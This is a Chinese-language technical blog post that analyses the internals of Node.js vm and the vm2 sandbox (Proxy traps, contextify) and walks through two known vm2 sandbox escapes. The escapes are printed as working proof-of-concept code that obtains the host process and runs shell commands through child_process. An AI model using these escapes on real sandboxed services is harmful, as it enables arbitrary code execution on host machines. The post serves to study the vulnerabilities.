# nodevm的运行流程

vm2其实是在vm的基础上进行二次开发所形成的一个沙箱运行环境，所以在内部本身的实现还是调用的是vm的机制。

要了解这部分知识必须先了解proxy:https://es6.ruanyifeng.com/?search=weakmap&x=0&y=0#docs/proxy

## 0x01 vm api

![image-20210920071650251](https://img.dem0dem0.top/images/image-20210920071650251.png)

对应的别人的代码就是

```javascript
const vm = require('vm');
const context = {
  animal: 'cat',
  count: 2
};//运行环境的上下文
const script = new vm.Script('count += 1; name = "kitty";'); //编译code
vm.createContext(context); // 创建一个上下文隔离对象
for (let i = 0; i < 10; ++i) {
  script.runInContext(context); // 在指定的下文里执行code并返回其结果 不用套for循环的
}
console.log(context);
```

或者使用vm自己创建的上下文环境

```javascript
const vm = require("vm");
console.log(vm.runInNewContext("let a = 2;a")); //2
```

其实在vm的逃逸中之所以会出现问题，也是因为对于外部的__constructor__和prototype的过滤不严格。

## 0x02 vm2 api

vm2的包的关键文档就只有以下四个部分

![image-20210920072607352](https://img.dem0dem0.top/images/image-20210920072607352.png)

包括了cli.js和contextify.js和main.js和sandbox.js四个文件

cli.js => 实现vm2的命令行调用

contextify.js => 处理了上下文 避免沙盒逃逸问题的出现； VMError Contextify 对global的buffer进行了处理

main.js => vm2执行的入口，导出了 `NodeVM`, `VM` 这两个沙箱环境，还有一个 `VMScript` 实际上是封装了 `vm.Script`

sandbox.js => hook了global的属性

## 0x03 vm2 运行原理

当我们创建一个VM的对象的时候，vm2内部引入了 `contextify.js`，并且针对上下文 `context` 进行了封装，最后调用 `script.runInContext(context)` ，可以看到，vm2最核心的操作就在于针对`context`的封装。

![image-20210920091349963](https://img.dem0dem0.top/images/image-20210920091349963.png)

分析一下这一行的代码的调用栈

![image-20210920091954260](https://img.dem0dem0.top/images/image-20210920091954260.png)

大概长这个样子，我们从最底层开始分析。

他新建了一个Proxy对下个，并且使用Object.assign来进行属性的拷贝

![image-20210920092223195](https://img.dem0dem0.top/images/image-20210920092223195.png)

我们会发现这样一个好玩的事情。这里就会将deeptrap和traps来进行合并，从而获得一个完整的属性，前面做的所有事情都是为了判断对象的类型，从而加上不同的traps。从而获得一个全新的proxy。

所以这样的话，在vm2的沙箱中运行的时候，访问对象的这些方法都会被沙箱本身拦截，从而获得不一样的体验。

## 0x04 代码分析跟踪

```
const {VM,VMScript} = require('VM2');
const fs = require('fs');
const file = `${__dirname}\\sandbox.js`;
const script = new VMScript(fs.readFileSync(file),file);
console.log((new VM()).run(script));


sandbox.js
let a = Buffer.from(""); //访问Buffer的from属性并调用
a.i = () => {}; //给对象添加属性
console.log(a.i); //访问对象的属性

```

![image-20210920094940936](https://img.dem0dem0.top/images/image-20210920094940936.png)

首先是buffer的from方法就被代理的get方法拦截。

![image-20210920100617683](https://img.dem0dem0.top/images/image-20210920100617683.png)

对他的调用 又被拦截

![image-20210920100736303](https://img.dem0dem0.top/images/image-20210920100736303.png)

设置方法也被拦截

![image-20210920100759957](https://img.dem0dem0.top/images/image-20210920100759957.png)

![image-20210920104931151](https://img.dem0dem0.top/images/image-20210920104931151.png)

我们看到，如果我们访问这个函数代理对象的 `constructor` 属性，返回的是 `host.Function` !

但是作者考虑到了这个因素的影响，所以我们在处理的时候，会调用他的get方法，在其中进行了处理，但是这里也是又问题的地方。

## 0x05 vm2逃逸分析

```
var handler = {
    get () {
     console.log("get");
    }
  };


  var target = {};

  var proxy = new Proxy(target, handler);

  Object.prototype.has = function(t, k){
    console.log("has");
  }

  proxy.a; //触发get
  "" in proxy; //触发has，这个has是在原型链上定义的w
```

我们很容易发现第一个get方法的出发就是proxy的正常使用，但是第二个方法，我们发现继承了Object的has方法。

然后我们来看一下,本身vm2的逃逸代码

```javascript
"use strict";

var process;

Object.prototype.has = function (t, k) {
    process = t.constructor("return process")();
};

"" in Buffer.from;
process.mainModule.require("child_process").execSync("whoami").toString()
```

我们知道在vm2中，作者并没有一开始就加上has方法，所以我们可以自己加上。这样在执行Buffer.from的时候就会触发has方法。

就会去执行我们定义好的has方法，由于 `proxy` 的机制，参数 `t` 是 `function Buffer.from` ，这个`function是在外部`的，其上下文是 nodejs 的global下，所以访问其 `constructor` 属性就获取到了外部的 `Function`，从而拿到外部的 `process`

在新版本中，作者增加了has方法，这样就不会去原型链上面寻找该方法，所以这个方法在新版本已经没有用了。

## 0x06 逃逸分析2

```
"use strict";
const {VM} = require('vm2');
const untrusted = `var process;
try{
    Object.defineProperty(Buffer.from(""), "", {get set(){
        Object.defineProperty(Object.prototype,"get",{get(){
            throw x=>x.constructor("return process")();
        }});
        return ()=>{};
    }});
}catch(e){
    process = e(()=>{});
}
process.mainModule.require("child_process").execSync("id").toString();`;
try{
    console.log(new VM().run(untrusted));
}catch(x){
    console.log(x);
}
```

当我们在a上定义新属性的时候，被代理的 `defineProperty` 拦截.检测传入的 `descriptor` 上是否设置了 get和set，如果是，调用外部的 `host.Object.defineProperty` 去实现设置对象属性的。

但是在执行 `descriptor.get` 的时候，由于 `nodejs`是异步的，此时已经执行了。所以他就会去执行我们设置的抛出异常的错误

![image-20210920115934701](https://img.dem0dem0.top/images/image-20210920115934701.png)

![image-20210920120027820](https://img.dem0dem0.top/images/image-20210920120027820.png)

![image-20210920120042258](https://img.dem0dem0.top/images/image-20210920120042258.png)

然后就逃出沙箱了

